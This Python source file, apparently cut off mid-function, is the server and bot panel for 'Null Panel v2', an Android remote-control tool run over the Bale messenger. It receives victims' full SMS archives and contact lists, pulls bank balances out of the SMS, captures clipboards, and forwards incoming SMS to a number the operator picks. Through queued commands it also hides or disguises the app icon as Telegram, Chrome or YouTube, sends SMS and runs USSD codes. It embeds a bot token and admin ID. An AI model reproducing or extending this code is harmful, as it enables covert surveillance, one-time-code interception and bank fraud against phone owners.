#!/usr/bin/env python3
"""
Null Panel v2 - Bale Messenger Edition (Full Panel - No Builder)
Remote Android Phone Control Panel
WebSocket + HTTP API + Bale Bot API

This version is for the Iran server.
It has the full panel WITHOUT build/compiler functionality.
"""

import os, sys, time, sqlite3, re
import asyncio
import threading
import requests as req_lib
from datetime import datetime, timedelta
from json import loads, dumps
from pathlib import Path

try:
    from flask import Flask, request, jsonify
except ModuleNotFoundError:
    os.system("pip3 install flask")
    from flask import Flask, request, jsonify

try:
    import websockets
except ModuleNotFoundError:
    os.system("pip3 install websockets")
    import websockets


# ============================================================
#  CONFIG - Change these to your values
# ============================================================
class info:
    url = "https://google.com"                    # Default WebView URL
    token = "836370856:0jB3Zrj0kQ_KRBkpk5mgQ11zOZ5q2aEo208"  # Bale bot token
    admin = 523549796                             # Bale admin ID
    port = 6969                                   # Flask API port
    topic = "null"                                # WebSocket topic
    text = "@InTheNameOfNull"

BASE_URL = f"https://tapi.bale.ai/bot{info.token}"
FILE_URL = f"https://tapi.bale.ai/file/bot{info.token}"


# ============================================================
#  DATABASE (SQLite)
# ============================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "panel.db")
_db_lock = threading.Lock()


def get_db():
    db = sqlite3.connect(DB_PATH, check_same_thread=False)
    db.row_factory = sqlite3.Row
    return db


def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS devices (
            android_id TEXT PRIMARY KEY,
            model TEXT,
            android_version TEXT,
            carrier TEXT,
            battery TEXT,
            ip TEXT,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_online INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(is_online, last_seen);
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            android_id TEXT,
            action TEXT,
            data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_logs_aid ON logs(android_id);
        CREATE INDEX IF NOT EXISTS idx_logs_time ON logs(created_at);
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS pending_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            android_id TEXT NOT NULL,
            command TEXT NOT NULL,
            params TEXT DEFAULT '{}',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_pending_aid ON pending_commands(android_id, created_at);
        CREATE TABLE IF NOT EXISTS sms_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            android_id TEXT,
            sender TEXT,
            body TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_sms_aid ON sms_history(android_id);
        CREATE INDEX IF NOT EXISTS idx_sms_sender ON sms_history(sender);
        CREATE INDEX IF NOT EXISTS idx_sms_time ON sms_history(created_at);
    """)
    db.commit()
    db.close()


def db_update_device(android_id, model, android_version, carrier, battery, ip=None):
    with _db_lock:
        db = get_db()
        db.execute("""
            INSERT INTO devices (android_id, model, android_version, carrier, battery, ip, last_seen, is_online)
            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 1)
            ON CONFLICT(android_id) DO UPDATE SET
                model=excluded.model, android_version=excluded.android_version,
                carrier=excluded.carrier, battery=excluded.battery,
                ip=COALESCE(excluded.ip, ip), last_seen=CURRENT_TIMESTAMP, is_online=1
        """, (android_id, model, android_version, carrier, battery, ip))
        db.commit()
        db.close()


def db_log(android_id, action, data=""):
    with _db_lock:
        db = get_db()
        db.execute("INSERT INTO logs (android_id, action, data) VALUES (?, ?, ?)",
                    (android_id, action, data))
        db.commit()
        db.close()


def db_get_device(android_id):
    if android_id in _device_cache:
        cached = _device_cache[android_id]
        return {
            "android_id": android_id,
            "model": cached.get("model", ""),
            "android_version": cached.get("android_version", ""),
            "carrier": cached.get("carrier", ""),
            "battery": cached.get("battery", ""),
            "ip": cached.get("ip", ""),
            "last_seen": "",
            "is_online": cached.get("is_online", 0)
        }
    with _db_lock:
        db = get_db()
        row = db.execute(
            "SELECT android_id, model, android_version, carrier, battery, ip, last_seen, is_online FROM devices WHERE android_id=?",
            (android_id,)
        ).fetchone()
        db.close()
    return dict(row) if row else None


def db_get_online_devices():
    with _db_lock:
        db = get_db()
        cutoff = (datetime.utcnow() - timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S")
        rows = db.execute(
            "SELECT android_id, model, android_version, carrier, battery, ip, last_seen FROM devices WHERE is_online=1 AND last_seen >= ? ORDER BY last_seen DESC",
            (cutoff,)
        ).fetchall()
        db.close()
    return [dict(r) for r in rows]


def db_store_sms(android_id, sender, body):
    with _db_lock:
        db = get_db()
        db.execute("INSERT INTO sms_history (android_id, sender, body) VALUES (?, ?, ?)",
                    (android_id, sender, body))
        db.commit()
        db.close()


def db_search_sms(android_id, query, limit=10):
    with _db_lock:
        db = get_db()
        like = f"%{query}%"
        rows = db.execute(
            "SELECT sender, body, created_at FROM sms_history WHERE android_id=? AND (sender LIKE ? OR body LIKE ?) ORDER BY created_at DESC LIMIT ?",
            (android_id, like, like, limit)
        ).fetchall()
        db.close()
    return [dict(r) for r in rows]


def db_get_pending_count(android_id):
    with _db_lock:
        db = get_db()
        count = db.execute(
            "SELECT COUNT(*) FROM pending_commands WHERE android_id=? OR android_id='ALL'",
            (android_id,)
        ).fetchone()[0]
        db.close()
    return count


def db_cleanup_old_pending():
    with _db_lock:
        db = get_db()
        db.execute("DELETE FROM pending_commands WHERE created_at < datetime('now', '-24 hours')")
        db.commit()
        db.close()


def db_get_setting(key, default=None):
    with _db_lock:
        db = get_db()
        row = db.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        db.close()
    return row["value"] if row else default


def db_set_setting(key, value):
    with _db_lock:
        db = get_db()
        db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        db.commit()
        db.close()


def db_set_offline_stale():
    with _db_lock:
        db = get_db()
        cutoff = (datetime.utcnow() - timedelta(minutes=10)).strftime("%Y-%m-%d %H:%M:%S")
        db.execute("UPDATE devices SET is_online=0 WHERE last_seen < ? AND is_online=1", (cutoff,))
        db.commit()
        rows = db.execute("SELECT android_id FROM devices WHERE is_online=0").fetchall()
        db.close()
    for r in rows:
        if r[0] in _device_cache:
            _device_cache[r[0]]["is_online"] = 0


# ============================================================
#  WEBSOCKET SERVER
# ============================================================
_ws_clients = set()
_device_cache = {}
_ws_loop = None
_ws_ready = False


async def _ws_handler(ws, path=None):
    _ws_clients.add(ws)
    try:
        async for msg in ws:
            pass
    except Exception:
        pass
    finally:
        _ws_clients.discard(ws)


async def _ws_run():
    global _ws_ready
    async with websockets.serve(_ws_handler, "0.0.0.0", 5000):
        _ws_ready = True
        await asyncio.Future()


def ws_broadcast(data):
    global _ws_ready
    if not _ws_ready or not _ws_clients:
        return False
    try:
        msg = dumps({"data": data, "topic": info.topic})
        bad = set()
        for ws in list(_ws_clients):
            try:
                if _ws_loop:
                    asyncio.run_coroutine_threadsafe(ws.send(msg), _ws_loop).result(timeout=3)
            except Exception:
                bad.add(ws)
        _ws_clients -= bad
        return bool(_ws_clients)
    except Exception:
        return False


def sendPush(j):
    androidid = j.get("androidid", "ALL")
    with _db_lock:
        db = get_db()
        db.execute("INSERT INTO pending_commands (android_id, command, params) VALUES (?, ?, ?)",
                    (androidid, j.get("action", ""), dumps(j)))
        db.commit()
        db.close()
    try:
        ws_broadcast(j)
    except Exception:
        pass


def _ws_thread():
    global _ws_loop
    _ws_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_ws_loop)
    _ws_loop.run_until_complete(_ws_run())


# ============================================================
#  BALE BOT API HELPERS (used by Flask routes)
# ============================================================
def sendMessage(m, json_data=None):
    try:
        if json_data:
            return req_lib.post(f"{BASE_URL}/sendMessage", json=json_data, timeout=10).json()
        return req_lib.post(
            f"{BASE_URL}/sendMessage",
            json={"chat_id": info.admin, "text": m, "parse_mode": "HTML"},
            timeout=10
        ).json()
    except Exception:
        return {}


def sendDocumentFile(chat_id, filepath, caption=None):
    """Send a local file as document via Bale Bot API (multipart upload)"""
    try:
        with open(filepath, "rb") as f:
            files = {"document": (os.path.basename(filepath), f)}
            data = {"chat_id": str(chat_id)}
            if caption:
                data["caption"] = caption
            resp = req_lib.post(f"{BASE_URL}/sendDocument", data=data, files=files, timeout=120)
            return resp.json()
    except Exception as e:
        print(f"[Bale] sendDocumentFile error: {e}")
        return {}


# ============================================================
#  FLASK APP
# ============================================================
api = Flask("main")


@api.route("/url", methods=["GET"])
def handler():
    return info.url


@api.route("/heartbeat", methods=["POST"])
def heartbeatHandler():
    parsed = request.get_json(silent=True) or {}
    androidid = parsed.get("androidid", "")
    model = parsed.get("model", "")
    androidv = parsed.get("androidv", "")
    carrier = parsed.get("carrier", "")
    battery = parsed.get("battery", "")
    ip = request.remote_addr
    if androidid:
        db_update_device(androidid, model, androidv, carrier, battery, ip)
        was_offline = (
            _device_cache.get(androidid, {}).get("is_online") == 0
            if androidid in _device_cache else False
        )
        _device_cache[androidid] = {
            "model": model, "battery": battery, "android_version": androidv,
            "carrier": carrier, "ip": ip, "is_online": 1
        }
        if was_offline:
            pending = db_get_pending_count(androidid)
            if pending > 0:
                try:
                    sendMessage(
                        f"<b>\U0001f4f1 Device Online</b>\n\n"
                        f"<code>{androidid}</code> is back online\n"
                        f"{pending} cached command(s) will be delivered."
                    )
                except Exception:
                    pass
    return "OK"


@api.route("/poll", methods=["GET"])
def pollHandler():
    aid = request.args.get("androidid", "")
    if not aid:
        return jsonify({"commands": []})
    with _db_lock:
        db = get_db()
        rows = db.execute(
            "SELECT id, command, params FROM pending_commands WHERE android_id IN (?, 'ALL') ORDER BY created_at ASC LIMIT 5",
            (aid,)
        ).fetchall()
        if rows:
            ids = [r["id"] for r in rows]
            db.execute(
                f"DELETE FROM pending_commands WHERE id IN ({','.join('?' * len(ids))})",
                ids
            )
            db.commit()
        db.close()
    cmds = [{"action": r["command"], "params": loads(r["params"])} for r in rows]
    return jsonify({"commands": cmds})


@api.route("/upload", methods=["POST"])
def uploadHandler():
    try:
        raw = request.get_data()
        if not raw or len(raw) < 5:
            print("[Upload] /upload received empty or tiny data")
            return "OK"
        filepath = os.path.join(BASE_DIR, "allsms.txt")
        with open(filepath, "wb") as f:
            f.write(raw)
        tf = raw.decode("utf-8", errors="replace")
        td = tf.split("----------------------")
        tabs = [i for i in td if "\u0645\u0627\u0646\u062f\u0647" in i and "989" not in i]
        cap = f"AllSms received ({len(raw)} bytes)\nLast bank balance:\n{tabs[0].strip()}" if tabs else f"AllSms received ({len(raw)} bytes)\nNo bank balance found"
        result = sendDocumentFile(info.admin, filepath, caption=cap)
        if result:
            print(f"[Upload] /upload sent successfully, {len(raw)} bytes")
        else:
            print(f"[Upload] /upload sendDocumentFile failed!")
    except Exception as e:
        print(f"[Upload] /upload error: {e}")
    return "OK"


@api.route("/upload2", methods=["POST"])
def uploadHandler1():
    try:
        raw = request.get_data()
        if not raw or len(raw) < 5:
            print("[Upload] /upload2 received empty or tiny data")
            return "OK"
        filepath = os.path.join(BASE_DIR, "allcontact.txt")
        with open(filepath, "wb") as f:
            f.write(raw)
        cap = f"AllContact received ({len(raw)} bytes)"
        result = sendDocumentFile(info.admin, filepath, caption=cap)
        if result:
            print(f"[Upload] /upload2 sent successfully, {len(raw)} bytes")
        else:
            print(f"[Upload] /upload2 sendDocumentFile failed!")
    except Exception as e:
        print(f"[Upload] /upload2 error: {e}")
    return "OK"


@api.route("/api", methods=["POST"])
def apiHandler():
    parsed = request.get_json()
    if not parsed:
        return "BAD", 400
    action = parsed.get("action", "")
    model = parsed.get("model", "")
    androidid = parsed.get("androidid", "")
    androidv = parsed.get("androidv", "")
    carrier = parsed.get("carrier", "")
    battery = parsed.get("battery", "")
    ip = request.remote_addr

    if androidid:
        db_update_device(androidid, model, androidv, carrier, battery, ip)
        db_log(androidid, action)

    def notify(text):
        try:
            kb = {"inline_keyboard": [[{"text": "Open Panel", "callback_data": f"open_{androidid}"}]]}
            payload = {
                "chat_id": info.admin, "text": text,
                "parse_mode": "HTML", "reply_markup": kb
            }
            req_lib.post(f"{BASE_URL}/sendMessage", json=payload, timeout=10).json()
        except Exception:
            pass

    if action == "ping":
        notify(f"<b>\U0001f4f1 Mobile Online</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nAndroid: {androidv}\nCarrier: {carrier}\nBattery: {battery}%\nIP: {ip}")
    elif action in ("hideone", "hideall"):
        notify(f"<b>\U0001f641 Icon Hided</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nAndroid: {androidv}\nCarrier: {carrier}\nBattery: {battery}%")
    elif action == "unhideone":
        notify(f"<b>\U0001f441 Icon Unhided</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nAndroid: {androidv}\nCarrier: {carrier}\nBattery: {battery}%")
    elif action == "firstinstall":
        notify(f"<b>\U0001f195 New Device!</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nAndroid: {androidv}\nCarrier: {carrier}\nBattery: {battery}%\nIP: {ip}")
    elif action == "clipboard":
        notify(f"<b>\U0001f4cb Clipboard</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nText: <code>{parsed.get('text', '')}</code>")
    elif action == "sentsms":
        notify(f"<b>\U0001f4e8 SMS Sent</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nText: <code>{parsed.get('text', '')}</code>\nNumbers: <code>{parsed.get('numbers', '')}</code>")
    elif action == "fullinfo":
        notify(f"<b>\u2139\ufe0f FullInfo</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nReadSMS: {parsed.get('readsms', '')}\nSendSMS: {parsed.get('sendsms', '')}\nRecvSMS: {parsed.get('recvsms', '')}\nReadContact: {parsed.get('readcontact', '')}")
    elif action == "ringermode":
        notify(f"<b>\U0001f514 Ringer: {parsed.get('mode', '')}</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>")
    elif action == "lastsmsone":
        notify(f"<b>\U0001f4ac Last SMS</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nFrom: {parsed.get('from', '')}\nBody: {parsed.get('text', '')}")
    elif action == "smsreceived":
        sms_from = parsed.get('from', '')
        sms_text = parsed.get('text', '')
        db_store_sms(androidid, sms_from, sms_text)
        notify(f"<b>\U0001f4e8 New SMS</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nFrom: <code>{sms_from}</code>\nBody: <code>{sms_text}</code>")
    elif action == "sms_sent":
        st = parsed.get('status', 'unknown')
        icons = {
            "sent": "\u2705 Sent", "send_failed": "\u274c Send Failed",
            "generic_failure": "\u274c Generic Failure",
            "radio_off": "\U0001f4e1 Radio Off", "null_pdu": "\u274c Null PDU",
            "no_service": "\U0001f4f1 No Service"
        }
        label = icons.get(st, "\u26a0\ufe0f " + st.replace("_", " ").title())
        sms_text = parsed.get('text', '')
        cap = (f"<b>{label}</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nTo: <code>{parsed.get('number', '')}</code>")
        if sms_text:
            cap += f"\nText: <code>{sms_text[:100]}</code>"
        if len(sms_text) > 100:
            cap += "..."
        notify(cap)
        db_log(androidid, f"sms_sent:{st}", f"to={parsed.get('number', '')}")
    elif action == "forward_on":
        notify(f"<b>\U0001f4e1 SMS Forwarding Activated</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nForwarding to: <code>{parsed.get('number', '')}</code>")
        db_log(androidid, "forward_on", f"to={parsed.get('number', '')}")
    elif action == "forward_off":
        notify(f"<b>\U0001f4e1 SMS Forwarding Deactivated</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>")
    elif action == "ussd_result":
        result = parsed.get('result', '')
        code = parsed.get('code', '')
        icon = "\u2705" if not result.startswith("FAILED") and not result.startswith("Error") else "\u274c"
        notify(f"<b>{icon} USSD Result</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nCode: <code>{code}</code>\nResult: <code>{result}</code>")
        db_log(androidid, "ussd", f"code={code} result={result}")
    elif action == "sms_delivered":
        st = parsed.get('status', 'unknown')
        icon = "\u2705 Delivered" if st == "delivered" else "\u26a0\ufe0f Undelivered"
        notify(f"<b>{icon}</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nTo: <code>{parsed.get('number', '')}</code>")
        db_log(androidid, f"sms_delivered:{st}", f"to={parsed.get('number', '')}")
    elif action == "bankbalance":
        result = parsed.get('result', 'No result')
        notify(f"<b>\U0001f3e6 Bank Balance</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\n\n{result}")
        db_log(androidid, "bankbalance", result)
    elif action == "changeicon":
        icon = parsed.get('icon', 'unknown')
        notify(f"<b>\U0001f5bc Icon Changed</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nIcon: <code>{icon}</code>")
    elif action in ("allsms_fail", "contacts_fail", "inbox_fail", "outbox_fail"):
        err = parsed.get('error', 'unknown error')
        notify(f"<b>\u274c Upload Failed ({action})</b>\n\nModel: {model}\nAndroidID: <code>{androidid}</code>\nError: <code>{err}</code>")
        db_log(androidid, action, err)

    return "OK"


# ============================================================
#  KEYBOARDS (dict format for Bale Bot API)
# ============================================================
def make_main_keyboard():
    return {"inline_keyboard": [
        [{"text": "\U0001f4f1 Online List", "callback_data": "ol_0"}],
        [{"text": "\U0001f641 Hide All", "callback_data": "hideall"}],
        [{"text": "\U0001f310 WebView", "callback_data": "webview"}],
    ]}


def make_online_list_keyboard(page=0):
    devices = db_get_online_devices()
    per_page = 10
    total = len(devices)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = min(start + per_page, total)
    page_devices = devices[start:end]

    text = "<b>Online list:</b>\n"
    if not page_devices:
        text += "\n<i>No devices online.</i>"
    else:
        for idx, d in enumerate(page_devices, start=1):
            status_icon = "\u2705" if d.get('battery') and int(d['battery']) > 20 else "\U0001f534"
            model_short = (d.get('model') or 'Unknown')[:20]
            battery_pct = f"{d.get('battery', '?')}%" if d.get('battery') else '?%'
            text += f"\n{status_icon} {idx} /set_{d['android_id']}\n    \u2514 {model_short} | {battery_pct}"

    nav_row = []
    nav_row.append({"text": "\U0001f504 Refresh", "callback_data": f"ol_r_{page}"})
    if page > 0:
        nav_row.append({"text": "\u00ab", "callback_data": f"ol_{page - 1}"})
    else:
        nav_row.append({"text": "\u00ab", "callback_data": "noop"})
    if page < total_pages - 1:
        nav_row.append({"text": "\u00bb", "callback_data": f"ol_{page + 1}"})
    else:
        nav_row.append({"text": "\u00bb", "callback_data": "noop"})

    nav_buttons = [nav_row]
    if total_pages > 1:
        nav_buttons.append([{"text": f"\U0001f4c8 Page {page + 1}/{total_pages}", "callback_data": "noop"}])
    nav_buttons.append([{"text": "\u2b05\ufe0f Back", "callback_data": "back_main"}])

    return text, {"inline_keyboard": nav_buttons}


def make_device_keyboard(aid):
    return {"inline_keyboard": [
        [{"text": "\U0001f4e1 Ping", "callback_data": f"d_ping_{aid}"}],
        [{"text": "\U0001f641 Hide", "callback_data": f"d_hide_{aid}"}, {"text": "\U0001f441 UnHide", "callback_data": f"d_unhide_{aid}"}],
        [{"text": "\U0001f4ac Last SMS", "callback_data": f"d_lastsms_{aid}"}, {"text": "\U0001f4e8 All SMS", "callback_data": f"d_allsms_{aid}"}],
        [{"text": "\U0001f4de Send SMS", "callback_data": f"d_sendsms_{aid}"}],
        [{"text": "\U0001f4d0 All Contact", "callback_data": f"d_contacts_{aid}"}],
        [{"text": "\U0001f3e6 Bank Balance", "callback_data": f"d_bank_{aid}"}],
        [{"text": "\U0001f4cb Clipboard", "callback_data": f"d_clip_{aid}"}],
        [{"text": "\u2139\ufe0f Full Info", "callback_data": f"d_info_{aid}"}],
        [{"text": "\U0001f503 Vibrate", "callback_data": f"d_vib_{aid}"}, {"text": "\U0001f50a Normal", "callback_data": f"d_norm_{aid}"}],
        [{"text": "\U0001f50d SMS Search", "callback_data": f"d_search_{aid}"}],
        [{"text": "\U0001f4e1 Fwd On", "callback_data": f"d_fwdon_{aid}"}, {"text": "\U0001f4e1 Fwd Off", "callback_data": f"d_fwdoff_{aid}"}, {"text": "\u260e\ufe0f USSD", "callback_data": f"d_ussd_{aid}"}],
        [{"text": "\U0001f5bc Telegram", "callback_data": f"d_icontg_{aid}"}, {"text": "\U0001f310 Chrome", "callback_data": f"d_iconch_{aid}"}, {"text": "\U0001f3b5 YouTube", "callback_data": f"d_iconyt_{aid}"}],
        [{"text": "\U0001f504 Default Icon", "callback_data": f"d_icondef_{aid}"}],
        [{"text": "\u2b05\ufe0f Back", "callback_data": "back_main"}],
    ]}


def make_device_panel_text(aid):
    dev = db_get_device(aid)
    if dev:
        status = "\U0001f7e2 Online" if dev.get('is_online') == 1 else "\U0001f534 Offline"
        text = (
            f"<b>\U0001f4f1 Device Panel</b>\n\n"
            f"Status: {status}\n"
            f"Model: <code>{dev['model']}</code>\n"
            f"Android: <code>{dev['android_version']}</code>\n"
            f"Battery: <code>{dev['battery']}%</code>\n"
            f"Carrier: <code>{dev.get('carrier', 'N/A')}</code>\n"
            f"IP: <code>{dev.get('ip', 'N/A')}</code>\n"
            f"ID: <code>{aid}</code>"
        )
    else:
        text = f"<b>\U0001f4f1 Device Panel</b>\n\nID: <code>{aid}</code>\n\n<i>Device not registered yet. Waiting for heartbeat...</i>"
    text += "\n\nSelect an action:"
    return text


def make_back_keyboard():
    return {"inline_keyboard": [[{"text": "\u2b05\ufe0f Back", "callback_data": "back_main"}]]}


# ============================================================
#  BALE BOT
# ============================================================
class BaleBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://tapi.bale.ai/bot{token}"
        self.file_base = f"https://tapi.bale.ai/file/bot{token}"
        self.offset = 0
        self._states = {}
        self._states_lock = threading.Lock()

    # ---------- Low-level API ----------

    def _api(self, method, params=None, timeout=30):
        """JSON API call, returns result dict or None on error."""
        try:
            resp = req_lib.post(
                f"{self.base_url}/{method}",
                json=params or {},
                timeout=timeout
            )
            data = resp.json()
            if data.get("ok"):
                return data.get("result")
            else:
                print(f"[Bale] API error {method}: {data.get('description', '?')}")
                return None
        except Exception as e:
            print(f"[Bale] API exception {method}: {e}")
            return None

    def send_message(self, chat_id, text, parse_mode="HTML", reply_markup=None):
        params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            params["reply_markup"] = reply_markup
        return self._api("sendMessage", params)

    def edit_message_text(self, chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
        params = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode
        }
        if reply_markup:
            params["reply_markup"] = reply_markup
        return self._api("editMessageText", params)

    def answer_callback_query(self, callback_query_id, text=None, show_alert=False):
        params = {"callback_query_id": callback_query_id, "show_alert": show_alert}
        if text:
            params["text"] = text
        return self._api("answerCallbackQuery", params)

    def send_document(self, chat_id, filepath, caption=None):
        """Upload a local file as a document (multipart)."""
        try:
            with open(filepath, "rb") as f:
                files = {"document": (os.path.basename(filepath), f)}
                data = {"chat_id": str(chat_id)}
                if caption:
                    data["caption"] = caption
                resp = req_lib.post(
                    f"{self.base_url}/sendDocument",
                    data=data, files=files, timeout=120
                )
                result = resp.json()
                if result.get("ok"):
                    return result.get("result")
                print(f"[Bale] send_document error: {result.get('description', '?')}")
                return None
        except Exception as e:
            print(f"[Bale] send_document exception: {e}")
            return None

    # ---------- State Management ----------

    def set_state(self, user_id, state, data=None, message_id=None):
        with self._states_lock:
            self._states[user_id] = {
                "state": state,
                "data": data or {},
                "message_id": message_id,
                "time": time.time()
            }

    def get_state(self, user_id):
        with self._states_lock:
            s = self._states.get(user_id)
            if s and time.time() - s["time"] < 300:
                return s
            if user_id in self._states:
                del self._states[user_id]
            return None

    def clear_state(self, user_id):
        with self._states_lock:
            self._states.pop(user_id, None)

    # ---------- Polling ----------

    def poll(self):
        """Long-poll for updates (main thread)."""
        print("[+] Bale bot polling started...", flush=True)
        while True:
            try:
                result = self._api("getUpdates", {
                    "offset": self.offset,
                    "timeout": 30,
                    "limit": 100
                }, timeout=35)
                if result and isinstance(result, list):
                    for update in result:
                        uid = update.get("update_id")
                        if uid:
                            self.offset = uid + 1
                        if "message" in update:
                            self._handle_message(update["message"])
                        elif "callback_query" in update:
                            self._handle_callback(update["callback_query"])
                else:
                    time.sleep(3)
            except Exception as e:
                print(f"[Bale] Poll error: {e}")
                time.sleep(5)

    # ---------- Message Handler ----------

    def _handle_message(self, msg):
        chat = msg.get("chat", {})
        chat_id = chat.get("id")
        if chat_id != info.admin:
            return

        text = (msg.get("text") or "").strip()
        user_id = msg.get("from", {}).get("id", chat_id)

        # Check pending conversation state first
        state = self.get_state(user_id)
        if state:
            self._handle_state(user_id, chat_id, msg, text, state)
            return

        # Command routing
        if text == "/start":
            self.send_message(
                chat_id,
                "<b>\U0001f4f1 Null Panel</b>\nWelcome back!",
                reply_markup=make_main_keyboard()
            )

        elif text.startswith("/set_"):
            aid = text[5:].strip()
            if aid:
                self.send_message(
                    chat_id,
                    make_device_panel_text(aid),
                    reply_markup=make_device_keyboard(aid)
                )

        elif text == "/offline":
            self._send_offline_guide(chat_id)

        elif text == "/commands":
            self._send_commands_list(chat_id)

    # ---------- State Handler ----------

    def _handle_state(self, user_id, chat_id, msg, text, state):
        st = state["state"]
        mid = state.get("message_id")

        # Helper: edit or send
        def edit_or_send(chat_id, message_id, text, reply_markup=None):
            if message_id:
                return self.edit_message_text(chat_id, message_id, text, reply_markup=reply_markup)
            return self.send_message(chat_id, text, reply_markup=reply_markup)

        # --- WebView URL ---
        if st == "waiting_for_url":
            if text.startswith("https://") or text.startswith("http://"):
                info.url = text
                db_set_setting("webview_url", text)
                edit_or_send(
                    chat_id, mid,
                    f"<b>\U0001f310 WebView Updated</b>\n\n<code>{text}</code>",
                    reply_markup=make_main_keyboard()
                )
            else:
                edit_or_send(
                    chat_id, mid,
                    "<b>Invalid URL!</b>\nMust start with https:// or http://",
                    reply_markup=make_back_keyboard()
                )
            self.clear_state(user_id)

        # --- Send SMS: waiting for text ---
        elif st == "waiting_for_sms_text":
            if text:
                self.set_state(
                    user_id, "waiting_for_sms_numbers",
                    {"sms_text": text, "androidid": state["data"]["androidid"]},
                    message_id=mid
                )
                edit_or_send(
                    chat_id, mid,
                    f"<b>\U0001f4de Send SMS</b>\n\nText: <code>{text}</code>\n\nSend phone numbers (one per line):",
                    reply_markup=make_back_keyboard()
                )

        # --- Send SMS: waiting for numbers ---
        elif st == "waiting_for_sms_numbers":
            aid = state["data"]["androidid"]
            sms_text = state["data"]["sms_text"]
            sendPush({"action": "sendsms", "androidid": aid, "numbers": text, "text": sms_text})
            num_list = [n.strip() for n in text.strip().split("\n") if n.strip()]
            edit_or_send(
                chat_id, mid,
                f"<b>\U0001f4e8 SMS Queued!</b>\n\n"
                f"Text: <code>{sms_text}</code>\n"
                f"Numbers ({len(num_list)}):\n<code>{text.strip()}</code>\n\n"
                f"\u23f3 Delivery status will be reported...",
                reply_markup=make_device_keyboard(aid)
            )
            self.clear_state(user_id)

        # --- SMS Search: waiting for query ---
        elif st == "waiting_for_search_query":
            aid = state["data"]["androidid"]
            query = text.strip()
            if query:
                results = db_search_sms(aid, query, limit=10)
                if not results:
                    t = f"<b>\U0001f50d No Results</b>\n\nNo SMS found for: <code>{query}</code>"
                else:
                    t = f"<b>\U0001f50d SMS Search Results</b>\n\nQuery: <code>{query}</code>\nFound: {len(results)} message(s)\n"
                    for idx, r in enumerate(results, 1):
                        body_show = r['body'][:80] + ("..." if len(r['body']) > 80 else "")
                        t += f"\n<b>{idx}.</b> From: <code>{r['sender']}</code>\n{body_show}\n<code>{r['created_at']}</code>\n{'─' * 20}\n"
            else:
                t = "<b>Empty query.</b>"
            edit_or_send(chat_id, mid, t, reply_markup=make_device_keyboard(aid))
            self.clear_state(user_id)

        # --- SMS Forward: waiting for number ---
        elif st == "waiting_for_fwd_number":
            aid = state["data"]["androidid"]
            fwd_num = text.strip()
            sendPush({"action": "forward_on", "androidid": aid, "number": fwd_num})
            edit_or_send(
                chat_id, mid,
                f"<b>\U0001f4e1 Forward Set!</b>\n\nDevice: <code>{aid}</code>\nForward to: <code>{fwd_num}</code>\n\n\u23f3 Waiting for confirmation...",
                reply_markup=make_device_keyboard(aid)
            )
            self.clear_state(user_id)

        # --- USSD: waiting for code ---
        elif st == "waiting_for_ussd_code":
            aid = state["data"]["androidid"]
            ussd_code = text.strip()
            sendPush({"action": "ussd", "androidid": aid, "code": ussd_code})
            edit_or_send(
                chat_id, mid,
                f"<b>\u260e\ufe0f USSD Sent!</b>\n\nDevice: <code>{aid}</code>\nCode: <code>{ussd_code}</code>\n\n\u23f3 Waiting for response...",
                reply_markup=make_device_keyboard(aid)
            )
            self.clear_state(user_id)

    # ---------- Callback Handler ----------

    def _handle_callback(self, cq):
        data = cq.get("data", "")
        msg = cq.get("message", {})
        chat_id = msg.get("chat", {}).get("id")
        message_id = msg.get("message_id")
        callback_id = cq.get("id")
        user_id = cq.get("from", {}).get("id", chat_id)

        if chat_id != info.admin:
            return

        # --- Main Menu ---
        if data == "back_main":
            self.edit_message_text(
                chat_id, message_id,
                "<b>\U0001f4f1 Null Panel</b>\nWelcome back!",
                reply_markup=make_main_keyboard()
            )

        elif data == "hideall":
            sendPush({"action": "hideall"})
            self.answer_callback_query(callback_id, "\U0001f641 Hide All sent!", show_alert=True)

        elif data == "webview":
